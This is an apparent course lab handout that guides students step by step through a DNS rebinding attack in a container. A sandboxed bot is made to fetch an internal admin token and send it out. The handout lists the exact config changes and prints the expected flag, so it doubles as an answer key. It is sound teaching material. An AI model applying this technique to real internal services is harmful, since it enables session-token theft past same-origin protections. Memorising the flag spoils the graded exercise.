# LAB F &middot; Activity 2: Perform the DNS rebind

**Time:** ~30-40 minutes &middot; **Goal:** make the in-container victim bot read the admin's session token by performing a DNS rebinding attack. Submit FLAG2.

## Recap of the setup

| Service | Address | Reachable from your real browser? |
| --- | --- | --- |
| Attacker dashboard | `http://localhost:30000` | yes |
| Internal admin | `http://127.0.0.1:8080` | no -- only the bot can reach it |

The admin has a **vulnerable** endpoint at `GET /admin/token` that returns a session token (FLAG2) to anyone who connects on its loopback. Your real browser can't reach it. The bot can -- but the bot enforces Same-Origin Policy on follow-up fetches, so you can't just hand it a URL like `http://127.0.0.1:8080/admin/token`. You need to use **DNS rebinding**.

## How the bot works (read this carefully)

1. You give the bot two configs in this directory: `dns_config.json` and `attack_plan.json`.
2. When you click **Run Bot** on the dashboard, the bot:
   - Loads `attack_plan.page_url`. The hostname in that URL becomes the *page origin*.
   - For each entry in `attack_plan.victim_actions`, if it's a `fetch`, the bot **rejects** any URL whose hostname differs from the page origin (Same-Origin Policy).
   - Hostnames are resolved using `dns_config.json`. Each hostname has an `initial_*` answer (used for the first lookup) and a `rebind_*` answer (used for every subsequent lookup, after `rebind_after_request` initial answers).

The trick: both the page-load and the follow-up fetch use the same hostname (`attacker.lab`), so SOP is happy. But because of rebinding, the second lookup returns the admin's address.

## What you need to change

Open `dns_config.json` and `attack_plan.json` in the LMS file editor.

### `dns_config.json`

```json
{
  "hostnames": [
    {
      "hostname": "attacker.lab",
      "initial_ip": "127.0.0.1",
      "initial_port": 30000,
      "rebind_ip": "127.0.0.1",
      "rebind_port": 30000,        <-- change this
      "rebind_after_request": 1
    }
  ]
}
```

Change `rebind_port` so subsequent lookups go to the **admin server** instead of bouncing back to the attacker server.

### `attack_plan.json`

```json
{
  "page_url": "http://attacker.lab/payload",
  "victim_actions": [
    { "action": "fetch", "url": "http://attacker.lab/admin/welcome" },   // change this URL
    { "action": "exfil", "data": "$last_response" }
  ]
}
```

Change the fetch URL so it points at the endpoint that returns the session token. (You can confirm the path on the admin server using `curl -s http://127.0.0.1:8080/admin/token` from the in-container terminal -- you saw similar endpoints in Activity 1.)

## Run the bot

1. Save both files.
2. On the dashboard (`http://localhost:30000`), click **Reload configs** to confirm the dashboard sees your changes.
3. Click **Run Bot**.

You should see, in the event log:

- `bot_load_page` -- the bot loaded `attacker.lab/payload`. `resolved_to` should be `127.0.0.1:30000`.
- `bot_fetch` -- the bot fetched `attacker.lab/admin/token`. `resolved_to` should be `127.0.0.1:8080` (this is the **rebind** firing).
- `bot_exfil` -- payload contains `IITB{labf_a2_dns_rebinding_works}`.

If you see `bot_sop_block` instead, your fetch URL has a different hostname from the page URL. Both must use `attacker.lab`.

## Submit

Copy the flag from the `bot_exfil` payload into `flag.txt`, save, click **Evaluate**.

The autograder checks two things:
1. `flag.txt` matches the expected flag.
2. The bot actually performed a successful exfiltration (it inspects the event log).

You need both to pass. You can't shortcut by typing the flag; you have to actually run the rebind.

## Troubleshooting

- **`bot_sop_block`**: the fetch URL's hostname differs from the page URL's hostname. Both must be `attacker.lab`.
- **`DNS lookup failed for 'X'`**: the hostname isn't in `dns_config.json`.
- **`bot_exfil` payload is the welcome banner, not the token**: you didn't change the fetch URL to `/admin/token`.
- **Got the welcome banner from `127.0.0.1:30000` (attacker's own response)**: you forgot to change `rebind_port` to `8080`.
- **Configs look stale on the dashboard**: click "Reload configs", or check that you saved the file in the LMS editor.

## Read after solving

When you've gotten FLAG2, [WALKTHROUGH.md](../WALKTHROUGH.md) (in the activity root) explains *why* this works in the real world and which mitigations actually stop it.
